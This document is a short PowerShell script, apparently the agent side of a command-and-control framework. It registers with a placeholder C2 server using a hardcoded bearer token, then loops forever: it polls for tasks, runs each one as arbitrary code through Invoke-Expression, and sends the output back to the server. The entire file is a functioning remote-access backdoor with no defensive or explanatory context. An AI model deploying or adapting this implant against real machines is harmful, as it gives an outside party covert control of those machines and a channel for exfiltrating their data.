# Agent.ps1
$C2_SERVER_IP = "http://C2-SERVER-IP:80"
$auth = "MySecretKey123"

# Register
$response = Invoke-RestMethod -Uri "$C2_SERVER_IP/register" -Method Post -Headers @{Authorization="Bearer $auth"}
$agent_id = $response.agent_id

# Example task loop
while ($true) {
    $task = Invoke-RestMethod -Uri "$C2_SERVER_IP/task/$agent_id" -Method Get -Headers @{Authorization="Bearer $auth"}
    if ($task.task) {
        $result = Invoke-Expression $task.task
        Invoke-RestMethod -Uri "$C2_SERVER_IP/result/$agent_id" -Method Post -Body $result -Headers @{Authorization="Bearer $auth"}
    }
    Start-Sleep -Seconds 2
}
